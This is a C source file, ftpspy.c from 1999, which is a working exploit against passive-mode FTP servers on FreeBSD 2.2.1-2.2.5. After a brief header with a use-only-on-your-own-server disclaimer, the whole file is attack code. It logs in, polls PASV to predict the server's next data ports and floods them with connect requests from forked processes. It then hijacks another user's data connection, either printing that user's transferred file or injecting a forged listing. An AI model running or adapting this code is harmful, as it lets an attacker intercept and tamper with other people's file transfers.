/*
	ftpspy.c
	This program is written to show vulnerability of some FTP servers
	then establish passive ftp connection.
	You MAY use this program or any part of it to test your ftp server
	for this vylnerability. You MUST NOT use this program or any part 
	of it against another FTP server. 

	The program distributed "AS IS" without any guarantees.

	This program uses the fact, that most TCP/IP stacks allocates TCP ports
	for applications one-by-one. Program creates FTP connection to FTPPORT
	of attacked machine, logs in as USER with PASS and then every RETRYDELAY
	seconds sends PASV command to server to find which TCP port is used now
	by server. After port is discovered program bombs next NTHREAD ports 
	starting from found port + OFFSET with "connect" requests.

	Vuln: FreeBSD 2.2.1-2.2.5

	(c) 1999 3APA3A aka Wise Tomcat
	Please send all your comments to wise@tomcat.ru
	         /\_/\
	        { . . }     |\
	+--oQQo->{ ^ }<-----+ \
	|  3APA3A  U  3APA3A   }
	+-------------o66o--+ /
	                    |/
*/


#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>     
#include <setjmp.h>     
#include <signal.h>

#define DEBUGLEVEL 1
#define USER "USER ftp\012"
#define PASS "PASS root@\012"
#define PASV "PASV\012"
#define NTHREADS 3
#define RETRYDELAY 10
#define FTPPORT 21
#define OFFSET 1
#define TIMEOUT 5

int gotit=0;
char buf[4100];
long size;
int port;


char * text =  "All my loving I will send to you\r\012All my loving, darling I'll be true\r\012 rw-r--r--  1 1012  5  406 Aug 08 10:08 loving\r\012" ;

void usage( char* progname) {
 fprintf(stderr, "Usage: %s ipaddr", progname);
 exit(1);
}

void getsignal(int sig){
	if(!gotit){

#if DEBUGLEVEL > 2
		fprintf(stderr, "Port %d killed\n", port);
#endif

		exit(0); /* Papa asks me to shutdown! */
	}
}


jmp_buf env;


int needalarm=0;
void br(int sig){
	if(needalarm) longjmp(env,1);
}
/* Read FTP SERVER replies while they begins '###-'. Last line looks like '### '. */

void getftpdata(int sock){
 char * newl;
 while( (size = read(sock, buf, 1024)) > 0 ){

#if DEBUGLEVEL > 1
	write(2, "<<", 2);
	write(2, buf, size);
#endif
	if( size > 0 ) buf[size] = 0;
	for( newl=buf; newl && ((newl-buf) < (size-3)); newl = strchr(newl, '\012') ) if(newl[3] != '-' && isdigit(newl[1]) ) return;
 }
}

/* write command to FTP SERVER*/

void writeftpdata(int sock, char* data){
	write(sock, data, strlen(data));

#if DEBUGLEVEL > 1
	write(2, ">>", 2);
	write(2, data, strlen(data));
#endif

}

int main(int argc, char* argv[]){
 struct sockaddr_in sin;
 int ftpsock, sock;
 char addr[16];
 int i;
 int code, a1, a2, a3, a4, p1, p2;
 pid_t children[NTHREADS];
 pid_t child;
 
 if(argc!=2) usage(argv[0]);
 sin.sin_addr.s_addr = inet_addr(argv[1]);
 sin.sin_family = AF_INET;
 sin.sin_port = htons(FTPPORT);
 if ((ftpsock = socket(AF_INET, SOCK_STREAM, 0)) == -1 ){
         fprintf(stderr, "Error: Unable to allocate socket\n");      
         return -1;                                 
 }

 /* connect to FTPPORT of FTP SERVER */

 if( connect(ftpsock, (struct sockaddr*)&sin,sizeof(sin)) == -1 ){
 	fprintf(stderr, "Unable to connect %s:%d\n", argv[1], FTPPORT);
 	return -2;
 }

 /* now log in as USER with PASS */

 getftpdata(ftpsock);
 writeftpdata(ftpsock, USER);
 getftpdata(ftpsock);
 writeftpdata(ftpsock, PASS);
 getftpdata(ftpsock);

#if DEBUGLEVEL > 0
 fprintf(stderr, "Logged on\n");
#endif


 for(;;){

	/* every RETRYDELAY seconds we send PASV  command to FTP SERVER
	   in order to have fresh inforamation about ports it listens */

 	writeftpdata(ftpsock, PASV);
	getftpdata(ftpsock);
	sscanf(buf, "%d Entering Passive Mode (%d,%d,%d,%d,%d,%d)", 
		&code, &a1, &a2, &a3, &a4, &p1, &p2);
	if( code < 200 || code > 300 ){
		fprintf(stderr, "Unable to enter PASV mode: %d\n", code);
		return -3;
	}
	sprintf(addr, "%d.%d.%d.%d", a1, a2, a3, a4);
	port = p1 * 256 + p2; /* FTP SERVER allocated this port for us */

#if DEBUGLEVEL > 2
	fprintf(stderr, "Got port %d\n", port);
#endif

	sin.sin_addr.s_addr = inet_addr(addr);

#if DEBUGLEVEL > 2
	fprintf(stderr, "Monitor: %s %d-%d\n", addr, port + 1, port + NTHREADS + OFFSET - 1);

	/* We will mpnitor this port range */

#endif

	/* now lets fork() with NTHREADS - one thfread for each port that will be bombed */

	for( i=0; (i < NTHREADS) && (child = fork()); i++ ) children[i] = child;
	if(child){ 		/* Lucky PAPA */

#if DEBUGLEVEL > 2
		fprintf(stderr, "%i threads started\n", i);
#endif

		/* It's good time to sleep little bit and then to kill
		   all this noisi children */

		sleep(RETRYDELAY);
		for( i=0; i<NTHREADS; i++ ) kill(children[i], SIGUSR1);
	}
	else {			/* Happy child */
		port += OFFSET +i;

#if DEBUGLEVEL > 2
		fprintf(stderr, "Monitor port %d started\n", port);
#endif

		signal(SIGUSR1, getsignal);
		signal(SIGALRM, br);
		sin.sin_port = htons(port);
		for(;;){	/* Lets bomb the port! */
			if( (sock = socket(AF_INET, SOCK_STREAM, 0)) == -1 ){
		  		printf("Error: Unable to allocate socket\n");      
				return -1;                                 
		 	}
			if( connect(sock, (struct sockaddr*)&sin,sizeof(sin)) != -1 ) break;
			close(sock);
 		}
 		gotit = 1;	/* We did it!!! */
 		printf("Got it!!!! Port:%d\n", port);
 		if(!setjmp(env)){
 			needalarm=1;
	 		alarm(TIMEOUT);
 			while( (size = read(sock, buf, 4096)) > 0 ) {
 				needalarm = 0;
 				write (1, buf, size);
 			}
 		}
 		else {
 			writeftpdata(sock, text);
 		}
 		close(sock);
 		return 0;
	}
 }
 return 0;
}